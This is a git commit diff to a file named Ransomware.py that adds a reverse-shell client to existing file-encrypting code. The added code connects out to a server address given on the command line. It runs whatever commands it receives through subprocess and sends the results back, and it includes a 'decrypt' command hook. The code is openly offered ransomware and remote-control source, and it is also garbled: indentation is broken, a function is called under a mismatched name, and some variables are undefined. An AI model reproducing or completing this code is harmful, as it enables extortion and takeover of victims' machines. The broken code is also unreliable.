4efde841376e0c4fec9400f312ed2267277ae703
Omnipuppy <110264682+Omnipuppy@users.noreply.github.com>
2023-01-12 17:01:51 -0600

    Update Ransomware to Support Client
    Needs Debug and Inspection

--- Ransomware.py
+++ Ransomware.py
@@ -1,7 +1,11 @@
+import os
+import subprocess
+import sys
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
+import socket
 from cryptography.fernet import Fernet
 symmetricKey  = Fernet.generate_key()
 FernetInstance = Fernet(symmetricKey)
@@ -20,4 +24,54 @@ with open("/home/usr/share/public_key.key", "rb") as key_file:
     encrypted_data = FernetInstance.encrypt(file_data)
    with open(filePath, "wb") as file:
        file.write(encrypted_data)
+       SERVER_HOST = sys.argv[1]
+SERVER_PORT = 43445
+BUFFER_SIZE = 1024 * 512 # 128KB max size of messages, feel free to increase
+# separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
+# create the socket object
+s = socket.socket()
+# connect to the server
+s.connect((SERVER_HOST, SERVER_PORT))
+# get the current directory
+cwd = os.getcwd()
+s.send(cwd.encode())
+while True:
+    # receive the command from the server
+    command = s.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    if splited_command[0].lower() == "decrypt":
+        decryptFileSystem(encryptedSymmetricKey)
+    if splited_command[0].lower() == "cd":
+        # cd command, change directory
+        try:
+            os.chdir(' '.join(splited_command[1:]))
+        except FileNotFoundError as e:
+            # if there is an error, set as the output
+            output = str(e)
+        else:
+            # if operation is successful, empty message
+            output = ""
+    else:
+        # execute the command and retrieve the results
+        output = subprocess.getoutput(command)
+    # get the current working directory as output
+    cwd = os.getcwd()
+    # send the results back to the server
+    message = f"{output}{SEPARATOR}{cwd}"
+    s.send(message.encode())
+# close client connection
+    s.close()
+           
+       def decryptFilesystem(encryptedSymmetricKey):
+           FernetInstance.decrypt(file_data)
+         with open(filePath, "wb") as file:
+       file.write(unencrypted_data)
+         break
    quit()
+   
+
+   
